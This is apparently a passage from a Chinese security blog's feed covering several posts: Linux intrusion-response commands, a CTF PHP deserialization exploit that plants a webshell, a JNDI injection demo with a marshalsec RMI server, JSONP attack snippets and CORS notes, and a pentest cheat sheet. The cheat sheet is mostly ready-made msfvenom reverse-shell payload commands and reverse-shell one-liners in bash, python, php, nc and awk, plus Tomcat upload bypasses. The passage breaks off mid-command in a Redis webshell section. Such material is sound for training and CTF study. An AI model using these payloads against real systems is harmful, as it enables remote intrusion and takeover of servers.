    <updated>2020-04-04T23:52:44.151Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关命令补充"><a href="#相关命令补充" class="headerlink" title="相关命令补充"></a>相关命令补充</h2><h2 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><p>用户信息文件/etc/passwd</p><pre><code>root:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</code></pre><p>注意：无密码只允许本机登陆，远程不允许登陆</p><p><code>/etc/shadow</code> 文件</p><pre><code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</code></pre><p>相关命令</p><pre><code>who   查看当前登录用户（tty本地登陆 pts远程登录）w    查看系统信息，想知道某一时刻用户的行为uptime 查看登陆多久、多少用户，负载</code></pre><p>查找特权用户(UID=0)</p><pre><code>awk -F: &#39;$3==0{print $1}&#39; /etc/passwd</code></pre><p>查找可以远程登陆的账号信息</p><pre><code>$ sudo awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadowroot:$6$ogEENApZAzc/p2XN$TQ.P2pRw7IwUuYPMXymUH2fbGNrNqJutxiao3xAJpCSYlhjNCL1BYByO1W75i4I6ri1GWGu61VMqexIXw5s0l.:18298:0:99999:7:::pxy:$6$7LQL0eO/Dk93UKqU$U9fSZEej9Dx1/InOImWFsfRdtWW2dJHzWYhnBRJj79.NLVQ9og.5E0jAo7eYB.vmwR9PuYjND.e4yBWwhqVvq.:18253:0:99999:7:::</code></pre><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p><pre><code>sudo more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></pre><p>禁用或者删除可疑的账号</p><pre><code>usermod -L user  禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头userdel user    删除user用户userdel -r user  将删除user用户，并且将/home目录下的user目录一并删除</code></pre><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul><li><p><code>history</code> 查看历史命令</p></li><li><p>打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</p></li></ul><p>保存一万条命令</p><pre><code>sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre><p>增加ip信息</p><pre><code class="bash">######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########</code></pre><p><code>source /etc/profile</code> 让配置生效</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;相关命令补充&quot;&gt;&lt;a href=&quot;#相关命令补充&quot; class=&quot;headerlink&quot; title=&quot;相关命令补充&quot;&gt;&lt;/a&gt;相关命令补充&lt;/h2&gt;&lt;h2 id=&quot;入侵排查思路&quot;&gt;&lt;a href=&quot;#入侵排查思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux" scheme="http://prontosil.com/tags/Linux/"/>
    
      <category term="应急响应" scheme="http://prontosil.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>无参RCE构造</title>
    <link href="http://prontosil.com/posts/d6a47f52/"/>
    <id>http://prontosil.com/posts/d6a47f52/</id>
    <published>2020-04-02T00:23:56.000Z</published>
    <updated>2020-04-02T23:18:35.551Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>反序列化题目整理</title>
    <link href="http://prontosil.com/posts/4e7aaa07/"/>
    <id>http://prontosil.com/posts/4e7aaa07/</id>
    <published>2020-04-01T10:34:33.000Z</published>
    <updated>2020-04-04T23:52:44.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="qwb-upload"><a href="#qwb-upload" class="headerlink" title="qwb upload"></a>qwb upload</h2><p>当初学的时候挺难的，现在做起来觉得挺简单了</p><p>入口 <code>Register.php</code></p><pre><code class="php">    public function __destruct()    {        if(!$this-&gt;registed){            $this-&gt;checker-&gt;index();        }    }</code></pre><p>调用 <code>checker</code> 属性的 index 方法，如果不存在，就会调用某个类的 <code>__call</code> 方法</p><p>正好有一个 <code>Profile.php</code> </p><pre><code class="php">    public function __get($name)    {        return $this-&gt;except[$name];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name}){            $this-&gt;{$this-&gt;{$name}}($arguments);        }    }</code></pre><p>那么就可以通过 <code>__call</code> 去调用其他的方法了，这里我们选择</p><pre><code class="php">    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }</code></pre><p><code>checker</code> 属性可控，<code>ext</code> 属性可控</p><p>进入到 <code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code> 即可将图片马改名</p><blockquote><p>这题复盘的时候比较玄学，挺难成功的</p></blockquote><p>调试过程</p><p><img src="/posts/4e7aaa07/1585910353276.png" alt></p><p>之后即可修改文件名</p><p><img src="/posts/4e7aaa07/1585910388138.png" alt></p><p>exp</p><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Register{    public $checker;    public $registed = false;    public function __construct($checker){        $this-&gt;checker = $checker;    }}class Profile{   # 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER[&#39;REMOTE_ADDR&#39;])/md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;    public $filename_tmp = &#39;./upload/2e25bf05f23b63a5b1f744933543d723/00bf23e130fa1e525e332ff03dae345d.png&#39;;    public $filename = &#39;./upload/2e25bf05f23b63a5b1f744933543d723/shell.php&#39;;    public $ext = true;    public $except = array(&#39;index&#39; =&gt; &#39;upload_img&#39;);}$register = new Register(new Profile());echo urlencode(base64_encode(serialize($register)));</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;qwb-upload&quot;&gt;&lt;a href=&quot;#qwb-upload&quot; class=&quot;headerlink&quot; title=&quot;qwb upload&quot;&gt;&lt;/a&gt;qwb upload&lt;/h2&gt;&lt;p&gt;当初学的时候挺难的，现在做起来觉得挺简单了&lt;/p&gt;
&lt;p&gt;入口 &lt;code&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="POP" scheme="http://prontosil.com/tags/POP/"/>
    
  </entry>
  
  <entry>
    <title>jndi入门</title>
    <link href="http://prontosil.com/posts/fe658142/"/>
    <id>http://prontosil.com/posts/fe658142/</id>
    <published>2020-03-22T08:52:41.000Z</published>
    <updated>2020-03-22T10:52:15.312Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。放两张直观的图</p><p><img src="/posts/fe658142/1.png" alt></p><p>从图中可以看出，JNDI相当于是更进一步的封装</p><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:34 **/import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import javax.naming.spi.NamingManager;public class test {    public static void initPerson() throws Exception{        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(3001);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:3001&quot;);        ////初始化        InitialContext ctx = new InitialContext();        //实例化person对象        Person p = new Person();        p.setName(&quot;pxy&quot;);        p.setPassword(&quot;12345&quot;);        //person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引        ctx.bind(&quot;person&quot;, p);        ctx.close();    }    public static void findPerson() throws Exception{        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(&quot;person&quot;);        System.out.println(person.toString());//        ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);        ctx.close();    }    public static void main(String[] args) throws Exception {        initPerson();        findPerson();    }}</code></pre><p>首先生成一个工厂，然后将对象绑定上，再去访问</p><p><img src="/posts/fe658142/1584867587547.png" alt></p><h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>上面的Demo里面，在初始化就预先指定了其上下文环境(RMI),但是在调用 lookup() 时，是可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 RMi的 URI 格式去<strong>转换</strong>(该变)上下文环境，使之访问 RMI 服务上的绑定对象：</p><pre><code class="java">Person person = (Person) ctx.lookup(&quot;rmi://localhost:3001/person&quot;);</code></pre><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>那么如果 <code>lookup</code> 的参数可控呢？</p><p>比如将其改为</p><pre><code>ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</code></pre><p>Exploit.java</p><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:37 **/public class Exploit {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;calc.exe&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>编译好之后，放到一个web目录下</p><p><img src="/posts/fe658142/1584867473029.png" alt></p><p>然后开启RMI服务</p><pre><code>java.exe -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8002/#Exploit 1099</code></pre><p><img src="/posts/fe658142/1584867499037.png" alt></p><p>运行即可弹出计算器</p><p><img src="/posts/fe658142/1584867538545.png" alt></p><p><img src="/posts/fe658142/1584867555946.png" alt></p><blockquote><p>在调试的时候遇到了一个问题，java版本不兼容，由于我电脑上存在java7和java8，会报错</p><p><img src="/posts/fe658142/1584867717633.png" alt></p><p><a href="https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0" target="_blank" rel="noopener">https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0</a></p></blockquote><h2 id="spring-JNDI注入"><a href="#spring-JNDI注入" class="headerlink" title="spring JNDI注入"></a>spring JNDI注入</h2><p>利用链：</p><p><code>JtaTransactionManager</code></p><p><img src="/posts/fe658142/1584868292042.png" alt></p><p>跟进 <code>initUserTransactionAndTransactionManager</code></p><p><img src="/posts/fe658142/1584874126510.png" alt></p><p>继续跟进 <code>lookupUserTransaction</code> 方法</p><p><img src="/posts/fe658142/1584874158465.png" alt></p><p>可以看到调用了lookup,而且我们可以看到整个调用链只要我们可控<code>userTransactionName</code>就可以,</p><p><img src="/posts/fe658142/1584874198634.png" alt></p><p>调用链比较简单，最后控制属性即可</p><pre><code class="java">org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();object.setUserTransactionName(jndiAddress);</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="jndi" scheme="http://prontosil.com/tags/jndi/"/>
    
  </entry>
  
  <entry>
    <title>CSRF相关总结</title>
    <link href="http://prontosil.com/posts/f70b79f3/"/>
    <id>http://prontosil.com/posts/f70b79f3/</id>
    <published>2020-03-19T07:27:00.000Z</published>
    <updated>2020-03-19T15:11:52.177Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始想写这篇文章的时候有点纠结分类，感觉归类到CTF不是很好，因为在CTF中就没遇到过，归类到渗透测试呢，又感觉不太对23333，算了还是丢到渗透测试吧</p><h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><p>SOP影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。</p><p>同源是指，<strong>域名，协议，端口相同</strong></p><p>跨域的种类</p><ul><li>协议不同</li><li>端口不同</li><li>主域名不同</li><li>子域名不同</li></ul><p>允许跨域的标签</p><pre><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;&lt;img src=&quot;...&quot;&gt;&lt;video src=&quot;...&quot;&gt;&lt;/video&gt;&lt;audio src=&quot;...&quot;&gt;&lt;/audio&gt;&lt;embed src=&quot;...&quot;&gt;&lt;frame src=&quot;...&quot;&gt;&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;&lt;applet code=&quot;...&quot;&gt;&lt;/applet&gt;&lt;object data=&quot;...&quot; &gt;&lt;/object&gt;</code></pre><p>同源策略虽然感觉很陌生，但确实前端的基石，地位类似于在牛顿定律在力学中的地位</p><p>试想没有同源策略的话，那么任何一个网页都可以随意操控其他网页的数据，那真的是web世界的灾难。就像牛顿定律如果失效，估计地球都不知道怎么绕太阳转了</p><p><strong>重点：</strong></p><p><strong>跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了</strong>。你可能会疑问明明通过表单的方式可以发起跨域请求，为什么 Ajax 就不会?因为归根结底，跨域是为了阻止用户读取到另一个域名下的内容，Ajax 可以获取响应，浏览器认为这不安全，所以拦截了响应。但是表单并不会获取新的内容，所以可以发起跨域请求。同时也说明了跨域并不能完全阻止 CSRF，因为请求毕竟是发出去了。</p><h2 id="如何跨域？"><a href="#如何跨域？" class="headerlink" title="如何跨域？"></a>如何跨域？</h2><p>跨域是必须的，因为同源策略的限制太严格了，子域名居然也和域名不同源！</p><ol><li>设置window.domain</li></ol><p>浏览器允许通过设置 <code>document.domain</code> 来共享cookie</p><ol start="2"><li>cookie本身的domain属性</li></ol><p>cookie本身可以设置 <code>domain</code> 属性，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。那么二级和三级域名也可以读取到cookie    </p><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><p>声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。</p><p>创建一个<code>&lt;script&gt;</code>标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。</p><p>服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是<code>show(&#39;我不爱你&#39;)</code>。</p><p>最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。</p><p>一个典型的jsonp攻击的代码</p><pre><code class="js">&lt;script&gt;function wooyun(v){    alert(v.username);}&lt;/script&gt;&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;</code></pre><p>发送请求过去之后，服务端返回了数据，然后就被弹出来了</p><p>遇到过的一个CTF题目</p><pre><code>&lt;script/src=&amp;unit=https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&gt;&lt;/script&gt;</code></pre><h4 id="防御jsonp攻击"><a href="#防御jsonp攻击" class="headerlink" title="防御jsonp攻击"></a>防御jsonp攻击</h4><p>验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <code>&lt;script&gt;</code> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！这个方法是可行的</p><ol><li>正则过滤不严谨</li><li>空referer</li></ol><h3 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h3><p>允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">同源</a>使用的限制。</p><p>区分简单请求和非简单请求：</p><pre><code>（1) 请求方法是以下三种方法之一：HEADGETPOST（2）HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</code></pre><p>满足以上要求即是简单请求</p><p>重点在最后一句： </p><blockquote><p>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</p></blockquote><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。这个字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8</code></pre><p>Access-Control-Allow-Origin： 要么是 origin 的值，要么就是 *</p><p>Access-Control-Allow-Credentials: 它的值是一个布尔值，表示是否允许发送Cookie。如果不要的话就删除这个字段</p><p>Access-Control-Expose-Headers：如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。</p><p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p><h2 id="cookie属性"><a href="#cookie属性" class="headerlink" title="cookie属性"></a>cookie属性</h2><p>cookie的五大属性:“path, domain, expire, HttpOnly, Secure”，很少有人了解到cookie还有一个SameSite属性，这是一个专门用于防止csrf漏洞的属性。</p><ol><li>http-only:</li></ol><p>浏览器会禁止页面中的 JavaScript 访问带有 HttpOnly 属性的 Cookie</p><ol start="2"><li>domain</li></ol><p>domain标识域，如域A为t1.test.com，域B为t2.test.com，那么在域A生产一个令域A和域B都能访问的cookie就要将该cookie的domain设置为.test.com</p><ol start="3"><li>expire</li></ol><p>过期时间</p><ol start="4"><li>Secure</li></ol><p>当设置为true时，表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以不会被窃取到Cookie 的具体内容。</p><ol start="5"><li>path</li></ol><p>path表示cookie所在的目录</p><h3 id="cookie分类"><a href="#cookie分类" class="headerlink" title="cookie分类"></a>cookie分类</h3><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><h3 id="samsite属性"><a href="#samsite属性" class="headerlink" title="samsite属性"></a>samsite属性</h3><p>面试真实问题：vue开发的前后端项目如何避免CSRF？</p><p>查到的解决方案：</p><ol><li>如果后端用Django开发，可以通过传递CSRF token过来</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;刚开始想写这篇文章的时候有点纠结分类，感觉归类到CTF不是很好，因为在CTF中就没遇到过，归类到渗透测试呢，又感觉不太对23333，算了还是丢到渗透测试吧&lt;/p&gt;
&lt;h2 id=&quot;同源策略-SOP&quot;&gt;&lt;a href=&quot;#同源策略-SOP&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CSRF" scheme="http://prontosil.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透常见知识</title>
    <link href="http://prontosil.com/posts/6941c9ee/"/>
    <id>http://prontosil.com/posts/6941c9ee/</id>
    <published>2020-03-18T01:09:58.000Z</published>
    <updated>2020-03-18T08:31:08.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>参数：</p><ul><li><p><code>-l</code> 列出相关的值，这些值包括 <code>payloads, encoders, nops, platforms, archs, encrypt, formats, all</code></p></li><li><p><code>-b</code> badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中</p></li><li><p><code>-e</code> 开启payload编码</p></li></ul><pre><code>msfvenom -l encoders 列出所有的编码器</code></pre><p>其中比较强大的有：</p><p><code>x86/shikata_ga_nai, cmd/powershell_base64</code></p><ul><li><code>-i</code> 指定编码次数</li><li><code>-x</code> 指定一个特定的可执行文件作为模板，常与 <code>-k</code> 联合使用，保护模板程序的功能，注入的payload作为一个新的进程运行</li><li><code>-n</code> 指定填充的nop数量</li></ul><h3 id="常用payload生成命令"><a href="#常用payload生成命令" class="headerlink" title="常用payload生成命令"></a>常用payload生成命令</h3><p>Windows (避免坏字节的出现)</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcpLHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o payload.exe</code></pre><p>Android</p><pre><code>//需要签名msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><p>powershell</p><pre><code>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</code></pre><p>Linux</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</code></pre><p>php</p><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw &gt; shell.php</code></pre><p>war</p><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war</code></pre><p>war包和jar包区别：</p><blockquote><p>war包是java web打的包，可以直接丢到tomcat的webapp目录下运行，jar包是java应用程序打的包，像spring boot打包就是jar，因为内置了web服务器</p></blockquote><p>python</p><pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</code></pre><p>Windows shellcode</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><p>Linux shellcode</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><h2 id="常用反弹shell"><a href="#常用反弹shell" class="headerlink" title="常用反弹shell"></a>常用反弹shell</h2><p>github项目：<a href="https://github.com/m0rph-1/revshellgen" target="_blank" rel="noopener">https://github.com/m0rph-1/revshellgen</a> 可以很方便地生成各种形式的反弹shell命令</p><p>bash反弹shell</p><pre><code>~/revshellgen (master ✔) ᐅ python revshellgen.py -i 127.0.0.1 -p 1234 -t bash[+] Reverse shell command:bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></pre><p>python反弹shell</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>nc反弹shell</p><pre><code>ncat 127.0.0.1 1234 -e /bin/shrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 1234 &gt;/tmp/f</code></pre><p>awk反弹shell</p><pre><code>awk &#39;BEGIN {s = &quot;/inet/tcp/0/127.0.0.1/1234&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre><p>nc-pipe</p><pre><code>/bin/sh | nc 127.0.0.1 1234</code></pre><h2 id="tomcat常见漏洞"><a href="#tomcat常见漏洞" class="headerlink" title="tomcat常见漏洞"></a>tomcat常见漏洞</h2><h3 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h3><p><code>/conf/web.xml</code> 文件中的readonly为false</p><pre><code>&lt;init-param&gt;    &lt;param-name&gt;readonly&lt;/param-name&gt;    &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>之后就可以通过PUT方式上传文件，但是 <code>.jsp</code> 的后缀会被限制</p><p>绕过方式：</p><ul><li>Windows文件名加空格 <code>PUT /x.jsp%20 HTTP/1.1</code> 上传之后在Windows下空格会被去掉</li><li>NTFS流， <code>PUT /x.jsp::$DATA HTTP/1.1</code></li><li><code>/</code>在文件名中是非法的，也会被去除（Linux/Windows) <code>PUT /x.jsp/ HTTP/1.1</code></li></ul><h3 id="tomcat-后台部署war包漏洞"><a href="#tomcat-后台部署war包漏洞" class="headerlink" title="tomcat 后台部署war包漏洞"></a>tomcat 后台部署war包漏洞</h3><p><code>tomcat-users.xml</code> 修改配置</p><pre><code>&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;user username=&quot;tomcat&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;&lt;user username=&quot;both&quot; password=&quot;admin&quot; roles=&quot;tomcat,role1&quot;/&gt;&lt;user username=&quot;role1&quot; password=&quot;admin&quot; roles=&quot;role1&quot;/&gt;</code></pre><p>之后访问到 <code>http://127.0.0.1:8080/manager</code></p><p>写一个shell.jsp，打包之后改名为war包上传即可getshell(也可以用msf生成一个war包)</p><h3 id="tomcat目录遍历"><a href="#tomcat目录遍历" class="headerlink" title="tomcat目录遍历"></a>tomcat目录遍历</h3><p><code>web.xml</code> 中如果 <code>listings</code> 参数为true，导致目录遍历漏洞</p><p><img src="/posts/6941c9ee/1584495111390.png" alt> </p><h2 id="redis常见漏洞"><a href="#redis常见漏洞" class="headerlink" title="redis常见漏洞"></a>redis常见漏洞</h2><p>给你一个未授权访问redis，你能做啥？</p><h3 id="redis写shell"><a href="#redis写shell" class="headerlink" title="redis写shell"></a>redis写shell</h3><pre><code>config set dir /var/www/htmlconfig set 